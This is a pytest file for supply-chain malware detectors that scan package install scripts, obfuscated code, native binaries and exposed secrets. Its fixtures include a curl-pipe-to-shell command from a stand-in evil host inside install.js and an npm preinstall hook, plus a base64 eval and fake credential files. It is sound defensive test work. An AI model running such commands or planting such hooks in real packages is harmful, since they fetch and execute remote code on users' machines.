"""Unit tests for install / obfuscate / native / perms detectors."""

from __future__ import annotations

import os

from supplicant.detect.install import InstallScriptDetector
from supplicant.detect.native import NativeBinaryDetector
from supplicant.detect.obfuscate import ObfuscationDetector
from supplicant.detect.perms import PermissionsDetector
from supplicant.models import Artifact

from .conftest import make_context, make_tree

NPM = Artifact("npm", "pkg", "1.0.0")


def test_install_detects_curl_pipe(tmp_path):
    ctx = make_context(tmp_path)
    tree = make_tree(tmp_path, {
        "install.js": 'require("child_process").exec("curl -s https://evil.example/x.sh | sh")\n',
    })
    sigs = InstallScriptDetector().scan_version(NPM, tree, ctx)
    kinds = {(s.severity, s.explanation) for s in sigs}
    assert any(sev == "high" for sev, _ in kinds)


def test_install_allows_known_hosts(tmp_path):
    ctx = make_context(tmp_path)
    tree = make_tree(tmp_path, {
        "install.js": 'fetch("https://registry.npmjs.org/pkg")\n',
    })
    sigs = InstallScriptDetector().scan_version(NPM, tree, ctx)
    assert all(s.severity != "high" for s in sigs)


def test_npm_script_hook_found(tmp_path):
    ctx = make_context(tmp_path)
    tree = make_tree(tmp_path, {
        "package.json": '{"name":"pkg","scripts":{"preinstall":"curl -s https://evil.example/x.sh | sh"}}',
    })
    sigs = InstallScriptDetector().scan_version(NPM, tree, ctx)
    assert any("package.json#scripts.preinstall" in s.evidence.get("file", "") for s in sigs)
    assert any(s.severity == "high" for s in sigs)


def test_obfuscate_flags_eval_and_entropy(tmp_path):
    ctx = make_context(tmp_path)
    tree = make_tree(tmp_path, {
        "evil.py": 'eval(base64.b64decode("aGVsbG8="))\n',
        "normal.py": "x = 1\n",
    })
    sigs = ObfuscationDetector().scan_version(NPM, tree, ctx)
    flagged = {s.evidence.get("file") for s in sigs}
    assert "evil.py" in flagged
    assert "normal.py" not in flagged


def test_native_detects_elf(tmp_path):
    ctx = make_context(tmp_path)
    tree = make_tree(tmp_path, {
        "libpayload.so": b"\x7fELF" + b"\x00" * 64,
    })
    sigs = NativeBinaryDetector().scan_version(NPM, tree, ctx)
    assert any("ELF" in s.evidence.get("format", "") for s in sigs)


def test_perms_flags_secret_with_content(tmp_path):
    ctx = make_context(tmp_path)
    tree = make_tree(tmp_path, {
        ".env": "AWS_SECRET_ACCESS_KEY=AKIA1234\n",
        "cert.pem": "-----BEGIN CERTIFICATE-----\nMIIC\n-----END CERTIFICATE-----\n",
        "id_rsa": "-----BEGIN RSA PRIVATE KEY-----\nabc\n",
    })
    sigs = PermissionsDetector().scan_version(NPM, tree, ctx)
    flagged = {s.evidence.get("file") for s in sigs}
    assert ".env" in flagged
    assert "id_rsa" in flagged
    assert "cert.pem" not in flagged  # public cert, not a credential


def test_perms_flags_setuid(tmp_path):
    ctx = make_context(tmp_path)
    tree = make_tree(tmp_path, {"tool": "#!/bin/sh\n", "tool2": "x"})
    os.chmod(tree / "tool", 0o4755)
    sigs = PermissionsDetector().scan_version(NPM, tree, ctx)
    assert any(s.evidence.get("file") == "tool" for s in sigs)
